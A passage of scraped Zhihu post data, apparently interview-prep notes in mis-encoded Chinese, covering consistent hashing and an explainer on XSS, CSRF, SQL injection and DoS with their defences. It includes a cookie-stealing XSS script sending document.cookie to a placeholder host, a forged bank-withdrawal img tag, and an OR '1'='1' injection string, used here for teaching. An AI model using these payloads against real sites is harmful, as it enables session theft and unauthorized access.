width=\"546\" data-original=\"https://pic4.zhimg.com/v2-4c7c93dbef7596647e271ee04422caf7_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;546&#39; height=&#39;564&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"546\" data-rawheight=\"564\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"546\" data-original=\"https://pic4.zhimg.com/v2-4c7c93dbef7596647e271ee04422caf7_r.jpg\" data-actualsrc=\"https://pic4.zhimg.com/v2-4c7c93dbef7596647e271ee04422caf7_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2>è™šæ‹ŸèŠ‚ç‚¹</h2><p>ä¸Šé¢æè¿°çš„ä¸€è‡´æ€§å“ˆå¸Œå­˜åœ¨æ•°æ®åˆ†å¸ƒä¸å‡åŒ€çš„é—®é¢˜ï¼ŒèŠ‚ç‚¹å­˜å‚¨çš„æ•°æ®é‡æœ‰å¯èƒ½ä¼šå­˜åœ¨å¾ˆå¤§çš„ä¸åŒã€‚</p><p>æ•°æ®ä¸å‡åŒ€ä¸»è¦æ˜¯å› ä¸ºèŠ‚ç‚¹åœ¨å“ˆå¸Œç¯ä¸Šåˆ†å¸ƒçš„ä¸å‡åŒ€ï¼Œè¿™ç§æƒ…å†µåœ¨èŠ‚ç‚¹æ•°é‡å¾ˆå°‘çš„æƒ…å†µä¸‹å°¤å…¶æ˜æ˜¾ã€‚</p><p>è§£å†³æ–¹å¼æ˜¯é€šè¿‡å¢åŠ è™šæ‹ŸèŠ‚ç‚¹ï¼Œç„¶åå°†è™šæ‹ŸèŠ‚ç‚¹æ˜ å°„åˆ°çœŸå®èŠ‚ç‚¹ä¸Šã€‚è™šæ‹ŸèŠ‚ç‚¹çš„æ•°é‡æ¯”çœŸå®èŠ‚ç‚¹æ¥å¾—å¤šï¼Œé‚£ä¹ˆè™šæ‹ŸèŠ‚ç‚¹åœ¨å“ˆå¸Œç¯ä¸Šåˆ†å¸ƒçš„å‡åŒ€æ€§å°±ä¼šæ¯”åŸæ¥çš„çœŸå®èŠ‚ç‚¹å¥½ï¼Œä»è€Œä½¿å¾—æ•°æ®åˆ†å¸ƒä¹Ÿæ›´åŠ å‡åŒ€ã€‚</p><h2>å‚è€ƒèµ„æ–™</h2><ul><li>å¤§è§„æ¨¡åˆ†å¸ƒå¼å­˜å‚¨ç³»ç»Ÿ</li><li><a href=\"https://link.zhihu.com/?target=https%3A//tech.meituan.com/cache_about.html\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">ç¼“å­˜é‚£äº›äº‹</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//my.oschina.net/jayhu/blog/732849\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">ä¸€è‡´æ€§å“ˆå¸Œç®—æ³•</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//zh.wikipedia.org/wiki/%25E5%2585%25A7%25E5%25AE%25B9%25E5%2582%25B3%25E9%2581%259E%25E7%25B6%25B2%25E8%25B7%25AF\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">å†…å®¹åˆ†å‘ç½‘ç»œ</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//www.aspirationhosting.com/aspiration-cdn/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">How Aspiration CDN helps to improve your website loading speed?</a></li></ul><p class=\"ztext-empty-paragraph\"><br/></p><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-2a4a3f26355998cfe8c467463a32a80d_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"937\" data-rawheight=\"354\" class=\"origin_image zh-lightbox-thumb\" width=\"937\" data-original=\"https://pic2.zhimg.com/v2-2a4a3f26355998cfe8c467463a32a80d_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;937&#39; height=&#39;354&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"937\" data-rawheight=\"354\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"937\" data-original=\"https://pic2.zhimg.com/v2-2a4a3f26355998cfe8c467463a32a80d_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-2a4a3f26355998cfe8c467463a32a80d_b.jpg\"/></figure><p></p>", 
            "topic": [
                {
                    "tag": "ç¼“å­˜", 
                    "tagLink": "https://api.zhihu.com/topics/19564998"
                }, 
                {
                    "tag": "é¢è¯•", 
                    "tagLink": "https://api.zhihu.com/topics/19552079"
                }
            ], 
            "comments": []
        }, 
        {
            "url": "https://zhuanlan.zhihu.com/p/68529177", 
            "userName": "CyC2018", 
            "userLink": "https://www.zhihu.com/people/de0dbaba77411ee53dd3207d762ad7d5", 
            "upvote": 0, 
            "title": "æ”»å‡»æŠ€æœ¯", 
            "content": "<p></p><h2>ä¸€ã€è·¨ç«™è„šæœ¬æ”»å‡»</h2><h2>æ¦‚å¿µ</h2><p>è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆCross-Site Scripting, XSSï¼‰ï¼Œå¯ä»¥å°†ä»£ç æ³¨å…¥åˆ°ç”¨æˆ·æµè§ˆçš„ç½‘é¡µä¸Šï¼Œè¿™ç§ä»£ç åŒ…æ‹¬ HTML å’Œ JavaScriptã€‚</p><h2>æ”»å‡»åŸç†</h2><p>ä¾‹å¦‚æœ‰ä¸€ä¸ªè®ºå›ç½‘ç«™ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨ä¸Šé¢å‘å¸ƒä»¥ä¸‹å†…å®¹ï¼š</p><div class=\"highlight\"><pre><code class=\"language-html\"><span class=\"p\">&lt;</span><span class=\"nt\">script</span><span class=\"p\">&gt;</span><span class=\"nx\">location</span><span class=\"p\">.</span><span class=\"nx\">href</span><span class=\"o\">=</span><span class=\"s2\">&#34;//domain.com/?c=&#34;</span> <span class=\"o\">+</span> <span class=\"nb\">document</span><span class=\"p\">.</span><span class=\"nx\">cookie</span><span class=\"p\">&lt;/</span><span class=\"nt\">script</span><span class=\"p\">&gt;</span></code></pre></div><p>ä¹‹åè¯¥å†…å®¹å¯èƒ½ä¼šè¢«æ¸²æŸ“æˆä»¥ä¸‹å½¢å¼ï¼š</p><div class=\"highlight\"><pre><code class=\"language-html\"><span class=\"p\">&lt;</span><span class=\"nt\">p</span><span class=\"p\">&gt;&lt;</span><span class=\"nt\">script</span><span class=\"p\">&gt;</span><span class=\"nx\">location</span><span class=\"p\">.</span><span class=\"nx\">href</span><span class=\"o\">=</span><span class=\"s2\">&#34;//domain.com/?c=&#34;</span> <span class=\"o\">+</span> <span class=\"nb\">document</span><span class=\"p\">.</span><span class=\"nx\">cookie</span><span class=\"p\">&lt;/</span><span class=\"nt\">script</span><span class=\"p\">&gt;&lt;/</span><span class=\"nt\">p</span><span class=\"p\">&gt;</span></code></pre></div><p>å¦ä¸€ä¸ªç”¨æˆ·æµè§ˆäº†å«æœ‰è¿™ä¸ªå†…å®¹çš„é¡µé¢å°†ä¼šè·³è½¬åˆ° <a href=\"https://link.zhihu.com/?target=http%3A//domain.com\" class=\" external\" target=\"_blank\" rel=\"nofollow noreferrer\"><span class=\"invisible\">http://</span><span class=\"visible\">domain.com</span><span class=\"invisible\"></span></a> å¹¶æºå¸¦äº†å½“å‰ä½œç”¨åŸŸçš„ Cookieã€‚å¦‚æœè¿™ä¸ªè®ºå›ç½‘ç«™é€šè¿‡ Cookie ç®¡ç†ç”¨æˆ·ç™»å½•çŠ¶æ€ï¼Œé‚£ä¹ˆæ”»å‡»è€…å°±å¯ä»¥é€šè¿‡è¿™ä¸ª Cookie ç™»å½•è¢«æ”»å‡»è€…çš„è´¦å·äº†ã€‚</p><h2>å±å®³</h2><ul><li>çªƒå–ç”¨æˆ·çš„ Cookie</li><li>ä¼ªé€ è™šå‡çš„è¾“å…¥è¡¨å•éª—å–ä¸ªäººä¿¡æ¯</li><li>æ˜¾ç¤ºä¼ªé€ çš„æ–‡ç« æˆ–è€…å›¾ç‰‡</li></ul><h2>é˜²èŒƒæ‰‹æ®µ</h2><h3>1. è®¾ç½® Cookie ä¸º HttpOnly</h3><p>è®¾ç½®äº† HttpOnly çš„ Cookie å¯ä»¥é˜²æ­¢ JavaScript è„šæœ¬è°ƒç”¨ï¼Œå°±æ— æ³•é€šè¿‡ document.cookie è·å–ç”¨æˆ· Cookie ä¿¡æ¯ã€‚</p><h3>2. è¿‡æ»¤ç‰¹æ®Šå­—ç¬¦</h3><p>ä¾‹å¦‚å°† <code>&lt;</code> è½¬ä¹‰ä¸º <code>&amp;lt;</code>ï¼Œå°† <code>&gt;</code> è½¬ä¹‰ä¸º <code>&amp;gt;</code>ï¼Œä»è€Œé¿å… HTML å’Œ Jascript ä»£ç çš„è¿è¡Œã€‚</p><p>å¯Œæ–‡æœ¬ç¼–è¾‘å™¨å…è®¸ç”¨æˆ·è¾“å…¥ HTML ä»£ç ï¼Œå°±ä¸èƒ½ç®€å•åœ°å°† <code>&lt;</code> ç­‰å­—ç¬¦è¿›è¡Œè¿‡æ»¤äº†ï¼Œæå¤§åœ°æé«˜äº† XSS æ”»å‡»çš„å¯èƒ½æ€§ã€‚</p><p>å¯Œæ–‡æœ¬ç¼–è¾‘å™¨é€šå¸¸é‡‡ç”¨ XSS filter æ¥é˜²èŒƒ XSS æ”»å‡»ï¼Œé€šè¿‡å®šä¹‰ä¸€äº›æ ‡ç­¾ç™½åå•æˆ–è€…é»‘åå•ï¼Œä»è€Œä¸å…è®¸æœ‰æ”»å‡»æ€§çš„ HTML ä»£ç çš„è¾“å…¥ã€‚</p><p>ä»¥ä¸‹ä¾‹å­ä¸­ï¼Œform å’Œ script ç­‰æ ‡ç­¾éƒ½è¢«è½¬ä¹‰ï¼Œè€Œ h å’Œ p ç­‰æ ‡ç­¾å°†ä¼šä¿ç•™ã€‚</p><div class=\"highlight\"><pre><code class=\"language-html\"><span class=\"p\">&lt;</span><span class=\"nt\">h1</span> <span class=\"na\">id</span><span class=\"o\">=</span><span class=\"s\">&#34;title&#34;</span><span class=\"p\">&gt;</span>XSS Demo<span class=\"p\">&lt;/</span><span class=\"nt\">h1</span><span class=\"p\">&gt;</span>\n\n<span class=\"p\">&lt;</span><span class=\"nt\">p</span><span class=\"p\">&gt;</span>123<span class=\"p\">&lt;/</span><span class=\"nt\">p</span><span class=\"p\">&gt;</span>\n\n<span class=\"p\">&lt;</span><span class=\"nt\">form</span><span class=\"p\">&gt;</span>\n  <span class=\"p\">&lt;</span><span class=\"nt\">input</span> <span class=\"na\">type</span><span class=\"o\">=</span><span class=\"s\">&#34;text&#34;</span> <span class=\"na\">name</span><span class=\"o\">=</span><span class=\"s\">&#34;q&#34;</span> <span class=\"na\">value</span><span class=\"o\">=</span><span class=\"s\">&#34;test&#34;</span><span class=\"p\">&gt;</span>\n<span class=\"p\">&lt;/</span><span class=\"nt\">form</span><span class=\"p\">&gt;</span>\n\n<span class=\"p\">&lt;</span><span class=\"nt\">pre</span><span class=\"p\">&gt;</span>hello<span class=\"p\">&lt;/</span><span class=\"nt\">pre</span><span class=\"p\">&gt;</span>\n\n<span class=\"p\">&lt;</span><span class=\"nt\">script</span> <span class=\"na\">type</span><span class=\"o\">=</span><span class=\"s\">&#34;text/javascript&#34;</span><span class=\"p\">&gt;</span>\n<span class=\"nx\">alert</span><span class=\"p\">(</span><span class=\"sr\">/xss/</span><span class=\"p\">);</span>\n<span class=\"p\">&lt;/</span><span class=\"nt\">script</span><span class=\"p\">&gt;</span>\n<span class=\"p\">&lt;</span><span class=\"nt\">h1</span><span class=\"p\">&gt;</span>XSS Demo<span class=\"p\">&lt;/</span><span class=\"nt\">h1</span><span class=\"p\">&gt;</span>\n\n<span class=\"p\">&lt;</span><span class=\"nt\">p</span><span class=\"p\">&gt;</span>123<span class=\"p\">&lt;/</span><span class=\"nt\">p</span><span class=\"p\">&gt;</span>\n\n<span class=\"ni\">&amp;lt;</span>form<span class=\"ni\">&amp;gt;</span>\n  <span class=\"ni\">&amp;lt;</span>input type=&#34;text&#34; name=&#34;q&#34; value=&#34;test&#34;<span class=\"ni\">&amp;gt;</span>\n<span class=\"ni\">&amp;lt;</span>/form<span class=\"ni\">&amp;gt;</span>\n\n<span class=\"p\">&lt;</span><span class=\"nt\">pre</span><span class=\"p\">&gt;</span>hello<span class=\"p\">&lt;/</span><span class=\"nt\">pre</span><span class=\"p\">&gt;</span>\n\n<span class=\"ni\">&amp;lt;</span>script type=&#34;text/javascript&#34;<span class=\"ni\">&amp;gt;</span>\nalert(/xss/);\n<span class=\"ni\">&amp;lt;</span>/script<span class=\"ni\">&amp;gt;</span></code></pre></div><blockquote><a href=\"https://link.zhihu.com/?target=http%3A//jsxss.com/zh/try.html\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">XSS è¿‡æ»¤åœ¨çº¿æµ‹è¯•</a><br/> </blockquote><h2>äºŒã€è·¨ç«™è¯·æ±‚ä¼ªé€ </h2><h2>æ¦‚å¿µ</h2><p>è·¨ç«™è¯·æ±‚ä¼ªé€ ï¼ˆCross-site request forgeryï¼ŒCSRFï¼‰ï¼Œæ˜¯æ”»å‡»è€…é€šè¿‡ä¸€äº›æŠ€æœ¯æ‰‹æ®µæ¬ºéª—ç”¨æˆ·çš„æµè§ˆå™¨å»è®¿é—®ä¸€ä¸ªè‡ªå·±æ›¾ç»è®¤è¯è¿‡çš„ç½‘ç«™å¹¶æ‰§è¡Œä¸€äº›æ“ä½œï¼ˆå¦‚å‘é‚®ä»¶ï¼Œå‘æ¶ˆæ¯ï¼Œç”šè‡³è´¢äº§æ“ä½œå¦‚è½¬è´¦å’Œè´­ä¹°å•†å“ï¼‰ã€‚ç”±äºæµè§ˆå™¨æ›¾ç»è®¤è¯è¿‡ï¼Œæ‰€ä»¥è¢«è®¿é—®çš„ç½‘ç«™ä¼šè®¤ä¸ºæ˜¯çœŸæ­£çš„ç”¨æˆ·æ“ä½œè€Œå»æ‰§è¡Œã€‚</p><p>XSS åˆ©ç”¨çš„æ˜¯ç”¨æˆ·å¯¹æŒ‡å®šç½‘ç«™çš„ä¿¡ä»»ï¼ŒCSRF åˆ©ç”¨çš„æ˜¯ç½‘ç«™å¯¹ç”¨æˆ·æµè§ˆå™¨çš„ä¿¡ä»»ã€‚</p><h2>æ”»å‡»åŸç†</h2><p>å‡å¦‚ä¸€å®¶é“¶è¡Œç”¨ä»¥æ‰§è¡Œè½¬è´¦æ“ä½œçš„ URL åœ°å€å¦‚ä¸‹ï¼š</p><div class=\"highlight\"><pre><code class=\"language-text\">http://www.examplebank.com/withdraw?account=AccoutName&amp;amount=1000&amp;for=PayeeNameã€‚</code></pre></div><p>é‚£ä¹ˆï¼Œä¸€ä¸ªæ¶æ„æ”»å‡»è€…å¯ä»¥åœ¨å¦ä¸€ä¸ªç½‘ç«™ä¸Šæ”¾ç½®å¦‚ä¸‹ä»£ç ï¼š</p><div class=\"highlight\"><pre><code class=\"language-text\">&lt;img src=&#34;http://www.examplebank.com/withdraw?account=Alice&amp;amount=1000&amp;for=Badman&#34;&gt;ã€‚</code></pre></div><p>å¦‚æœæœ‰è´¦æˆ·åä¸º Alice çš„ç”¨æˆ·è®¿é—®äº†æ¶æ„ç«™ç‚¹ï¼Œè€Œå¥¹ä¹‹å‰åˆšè®¿é—®è¿‡é“¶è¡Œä¸ä¹…ï¼Œç™»å½•ä¿¡æ¯å°šæœªè¿‡æœŸï¼Œé‚£ä¹ˆå¥¹å°±ä¼šæŸå¤± 1000 ç¾å…ƒã€‚</p><p>è¿™ç§æ¶æ„çš„ç½‘å€å¯ä»¥æœ‰å¾ˆå¤šç§å½¢å¼ï¼Œè—èº«äºç½‘é¡µä¸­çš„è®¸å¤šåœ°æ–¹ã€‚æ­¤å¤–ï¼Œæ”»å‡»è€…ä¹Ÿä¸éœ€è¦æ§åˆ¶æ”¾ç½®æ¶æ„ç½‘å€çš„ç½‘ç«™ã€‚ä¾‹å¦‚ä»–å¯ä»¥å°†è¿™ç§åœ°å€è—åœ¨è®ºå›ï¼Œåšå®¢ç­‰ä»»ä½•ç”¨æˆ·ç”Ÿæˆå†…å®¹çš„ç½‘ç«™ä¸­ã€‚è¿™æ„å‘³ç€å¦‚æœæœåŠ¡å™¨ç«¯æ²¡æœ‰åˆé€‚çš„é˜²å¾¡æªæ–½çš„è¯ï¼Œç”¨æˆ·å³ä½¿è®¿é—®ç†Ÿæ‚‰çš„å¯ä¿¡ç½‘ç«™ä¹Ÿæœ‰å—æ”»å‡»çš„å±é™©ã€‚</p><p>é€šè¿‡ä¾‹å­èƒ½å¤Ÿçœ‹å‡ºï¼Œæ”»å‡»è€…å¹¶ä¸èƒ½é€šè¿‡ CSRF æ”»å‡»æ¥ç›´æ¥è·å–ç”¨æˆ·çš„è´¦æˆ·æ§åˆ¶æƒï¼Œä¹Ÿä¸èƒ½ç›´æ¥çªƒå–ç”¨æˆ·çš„ä»»ä½•ä¿¡æ¯ã€‚ä»–ä»¬èƒ½åšåˆ°çš„ï¼Œæ˜¯æ¬ºéª—ç”¨æˆ·æµè§ˆå™¨ï¼Œè®©å…¶ä»¥ç”¨æˆ·çš„åä¹‰æ‰§è¡Œæ“ä½œã€‚</p><h2>é˜²èŒƒæ‰‹æ®µ</h2><h3>1. æ£€æŸ¥ Referer é¦–éƒ¨å­—æ®µ</h3><p>Referer é¦–éƒ¨å­—æ®µä½äº HTTP æŠ¥æ–‡ä¸­ï¼Œç”¨äºæ ‡è¯†è¯·æ±‚æ¥æºçš„åœ°å€ã€‚æ£€æŸ¥è¿™ä¸ªé¦–éƒ¨å­—æ®µå¹¶è¦æ±‚è¯·æ±‚æ¥æºçš„åœ°å€åœ¨åŒä¸€ä¸ªåŸŸåä¸‹ï¼Œå¯ä»¥æå¤§çš„é˜²æ­¢ CSRF æ”»å‡»ã€‚</p><p>è¿™ç§åŠæ³•ç®€å•æ˜“è¡Œï¼Œå·¥ä½œé‡ä½ï¼Œä»…éœ€è¦åœ¨å…³é”®è®¿é—®å¤„å¢åŠ ä¸€æ­¥æ ¡éªŒã€‚ä½†è¿™ç§åŠæ³•ä¹Ÿæœ‰å…¶å±€é™æ€§ï¼Œå› å…¶å®Œå…¨ä¾èµ–æµè§ˆå™¨å‘é€æ­£ç¡®çš„ Referer å­—æ®µã€‚è™½ç„¶ HTTP åè®®å¯¹æ­¤å­—æ®µçš„å†…å®¹æœ‰æ˜ç¡®çš„è§„å®šï¼Œä½†å¹¶æ— æ³•ä¿è¯æ¥è®¿çš„æµè§ˆå™¨çš„å…·ä½“å®ç°ï¼Œäº¦æ— æ³•ä¿è¯æµè§ˆå™¨æ²¡æœ‰å®‰å…¨æ¼æ´å½±å“åˆ°æ­¤å­—æ®µã€‚å¹¶ä¸”ä¹Ÿå­˜åœ¨æ”»å‡»è€…æ”»å‡»æŸäº›æµè§ˆå™¨ï¼Œç¯¡æ”¹å…¶ Referer å­—æ®µçš„å¯èƒ½ã€‚</p><h3>2. æ·»åŠ æ ¡éªŒ Token</h3><p>åœ¨è®¿é—®æ•æ„Ÿæ•°æ®è¯·æ±‚æ—¶ï¼Œè¦æ±‚ç”¨æˆ·æµè§ˆå™¨æä¾›ä¸ä¿å­˜åœ¨ Cookie ä¸­ï¼Œå¹¶ä¸”æ”»å‡»è€…æ— æ³•ä¼ªé€ çš„æ•°æ®ä½œä¸ºæ ¡éªŒã€‚ä¾‹å¦‚æœåŠ¡å™¨ç”Ÿæˆéšæœºæ•°å¹¶é™„åŠ åœ¨è¡¨å•ä¸­ï¼Œå¹¶è¦æ±‚å®¢æˆ·ç«¯ä¼ å›è¿™ä¸ªéšæœºæ•°ã€‚</p><h3>3. è¾“å…¥éªŒè¯ç </h3><p>å› ä¸º CSRF æ”»å‡»æ˜¯åœ¨ç”¨æˆ·æ— æ„è¯†çš„æƒ…å†µä¸‹å‘ç”Ÿçš„ï¼Œæ‰€ä»¥è¦æ±‚ç”¨æˆ·è¾“å…¥éªŒè¯ç å¯ä»¥è®©ç”¨æˆ·çŸ¥é“è‡ªå·±æ­£åœ¨åšçš„æ“ä½œã€‚</p><h2>ä¸‰ã€SQL æ³¨å…¥æ”»å‡»</h2><h2>æ¦‚å¿µ</h2><p>æœåŠ¡å™¨ä¸Šçš„æ•°æ®åº“è¿è¡Œéæ³•çš„ SQL è¯­å¥ï¼Œä¸»è¦é€šè¿‡æ‹¼æ¥æ¥å®Œæˆã€‚</p><h2>æ”»å‡»åŸç†</h2><p>ä¾‹å¦‚ä¸€ä¸ªç½‘ç«™ç™»å½•éªŒè¯çš„ SQL æŸ¥è¯¢ä»£ç ä¸ºï¼š</p><div class=\"highlight\"><pre><code class=\"language-sql\"><span class=\"n\">strSQL</span> <span class=\"o\">=</span> <span class=\"s2\">&#34;SELECT * FROM users WHERE (name = &#39;&#34;</span> <span class=\"o\">+</span> <span class=\"n\">userName</span> <span class=\"o\">+</span> <span class=\"s2\">&#34;&#39;) and (pw = &#39;&#34;</span><span class=\"o\">+</span> <span class=\"n\">passWord</span> <span class=\"o\">+</span><span class=\"s2\">&#34;&#39;);&#34;</span></code></pre></div><p>å¦‚æœå¡«å…¥ä»¥ä¸‹å†…å®¹ï¼š</p><div class=\"highlight\"><pre><code class=\"language-sql\"><span class=\"n\">userName</span> <span class=\"o\">=</span> <span class=\"s2\">&#34;1&#39; OR &#39;1&#39;=&#39;1&#34;</span><span class=\"p\">;</span>\n<span class=\"n\">passWord</span> <span class=\"o\">=</span> <span class=\"s2\">&#34;1&#39; OR &#39;1&#39;=&#39;1&#34;</span><span class=\"p\">;</span></code></pre></div><p>é‚£ä¹ˆ SQL æŸ¥è¯¢å­—ç¬¦ä¸²ä¸ºï¼š</p><div class=\"highlight\"><pre><code class=\"language-sql\"><span class=\"n\">strSQL</span> <span class=\"o\">=</span> <span class=\"s2\">&#34;SELECT * FROM users WHERE (name = &#39;1&#39; OR &#39;1&#39;=&#39;1&#39;) and (pw = &#39;1&#39; OR &#39;1&#39;=&#39;1&#39;);&#34;</span></code></pre></div><p>æ­¤æ—¶æ— éœ€éªŒè¯é€šè¿‡å°±èƒ½æ‰§è¡Œä»¥ä¸‹æŸ¥è¯¢ï¼š</p><div class=\"highlight\"><pre><code class=\"language-sql\"><span class=\"n\">strSQL</span> <span class=\"o\">=</span> <span class=\"s2\">&#34;SELECT * FROM users;&#34;</span></code></pre></div><h2>é˜²èŒƒæ‰‹æ®µ</h2><h3>1. ä½¿ç”¨å‚æ•°åŒ–æŸ¥è¯¢</h3><p>Java ä¸­çš„ PreparedStatement æ˜¯é¢„å…ˆç¼–è¯‘çš„ SQL è¯­å¥ï¼Œå¯ä»¥ä¼ å…¥é€‚å½“å‚æ•°å¹¶ä¸”å¤šæ¬¡æ‰§è¡Œã€‚ç”±äºæ²¡æœ‰æ‹¼æ¥çš„è¿‡ç¨‹ï¼Œå› æ­¤å¯ä»¥é˜²æ­¢ SQL æ³¨å…¥çš„å‘ç”Ÿã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"n\">PreparedStatement</span> <span class=\"n\">stmt</span> <span class=\"o\">=</span> <span class=\"n\">connection</span><span class=\"o\">.</span><span class=\"na\">prepareStatement</span><span class=\"o\">(</span><span class=\"s\">&#34;SELECT * FROM users WHERE userid=? AND password=?&#34;</span><span class=\"o\">);</span>\n<span class=\"n\">stmt</span><span class=\"o\">.</span><span class=\"na\">setString</span><span class=\"o\">(</span><span class=\"n\">1</span><span class=\"o\">,</span> <span class=\"n\">userid</span><span class=\"o\">);</span>\n<span class=\"n\">stmt</span><span class=\"o\">.</span><span class=\"na\">setString</span><span class=\"o\">(</span><span class=\"n\">2</span><span class=\"o\">,</span> <span class=\"n\">password</span><span class=\"o\">);</span>\n<span class=\"n\">ResultSet</span> <span class=\"n\">rs</span> <span class=\"o\">=</span> <span class=\"n\">stmt</span><span class=\"o\">.</span><span class=\"na\">executeQuery</span><span class=\"o\">();</span></code></pre></div><h3>2. å•å¼•å·è½¬æ¢</h3><p>å°†ä¼ å…¥çš„å‚æ•°ä¸­çš„å•å¼•å·è½¬æ¢ä¸ºè¿ç»­ä¸¤ä¸ªå•å¼•å·ï¼ŒPHP ä¸­çš„ Magic quote å¯ä»¥å®Œæˆè¿™ä¸ªåŠŸèƒ½ã€‚</p><h2>å››ã€æ‹’ç»æœåŠ¡æ”»å‡»</h2><p>æ‹’ç»æœåŠ¡æ”»å‡»ï¼ˆdenial-of-service attackï¼ŒDoSï¼‰ï¼Œäº¦ç§°æ´ªæ°´æ”»å‡»ï¼Œå…¶ç›®çš„åœ¨äºä½¿ç›®æ ‡ç”µè„‘çš„ç½‘ç»œæˆ–ç³»ç»Ÿèµ„æºè€—å°½ï¼Œä½¿æœåŠ¡æš‚æ—¶ä¸­æ–­æˆ–åœæ­¢ï¼Œå¯¼è‡´å…¶æ­£å¸¸ç”¨æˆ·æ— æ³•è®¿é—®ã€‚</p><p>åˆ†å¸ƒå¼æ‹’ç»æœåŠ¡æ”»å‡»ï¼ˆdistributed denial-of-service attackï¼ŒDDoSï¼‰ï¼ŒæŒ‡æ”»å‡»è€…ä½¿ç”¨ä¸¤ä¸ªæˆ–ä»¥ä¸Šè¢«æ”»é™·çš„ç”µè„‘ä½œä¸ºâ€œåƒµå°¸â€å‘ç‰¹å®šçš„ç›®æ ‡å‘åŠ¨â€œæ‹’ç»æœåŠ¡â€å¼æ”»å‡»ã€‚</p><h2>å‚è€ƒèµ„æ–™</h2><ul><li><a href=\"https://link.zhihu.com/?target=https%3A//zh.wikipedia.org/wiki/%25E8%25B7%25A8%25E7%25B6%25B2%25E7%25AB%2599%25E6%258C%2587%25E4%25BB%25A4%25E7%25A2%25BC\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">ç»´åŸºç™¾ç§‘ï¼šè·¨ç«™è„šæœ¬</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//zh.wikipedia.org/wiki/SQL%25E8%25B3%2587%25E6%2596%2599%25E9%259A%25B1%25E7%25A2%25BC%25E6%2594%25BB%25E6%2593%258A\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">ç»´åŸºç™¾ç§‘ï¼šSQL æ³¨å…¥æ”»å‡»</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//zh.wikipedia.org/wiki/%25E8%25B7%25A8%25E7%25AB%2599%25E8%25AF%25B7%25E6%25B1%2582%25E4%25BC%25AA%25E9%2580%25A0\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">ç»´åŸºç™¾ç§‘ï¼šè·¨ç«™ç‚¹è¯·æ±‚ä¼ªé€ </a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//zh.wikipedia.org/wiki/%25E9%2598%25BB%25E6%2596%25B7%25E6%259C%258D%25E5%258B%2599%25E6%2594%25BB%25E6%2593%258A\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">ç»´åŸºç™¾ç§‘ï¼šæ‹’ç»æœåŠ¡æ”»å‡»</a></li></ul><p class=\"ztext-empty-paragraph\"><br/></p><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-2a4a3f26355998cfe8c467463a32a80d_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"937\" data-rawheight=\"354\" class=\"origin_image zh-lightbox-thumb\" width=\"937\" data-original=\"https://pic2.zhimg.com/v2-2a4a3f26355998cfe8c467463a32a80d_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;937&#39; height=&#39;354&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"937\" data-rawheight=\"354\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"937\" data-original=\"https://pic2.zhimg.com/v2-2a4a3f26355998cfe8c467463a32a80d_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-2a4a3f26355998cfe8c467463a32a80d_b.jpg\"/></figure><p></p>", 
            "topic": [
                {
                    "tag": "ç½‘ç»œæ”»å‡»", 
                    "tagLink": "https://api.zhihu.com/topics/19568943"
                }, 
                {
                    "tag": "é¢è¯•", 
                    "tagLink": "https://api.zhihu.com/topics/19552079"
                }
            ], 
            "comments": []
        }, 
        {
            "url": "https://zhuanlan.zhihu.com/p/68528961", 
            "userName": "CyC2018", 
            "userLink": "https://www.zhihu.com/people/de0dbaba77411ee53dd3207d762ad7d5", 
            "upvote": 0, 
            "title": "é›†ç¾¤", 
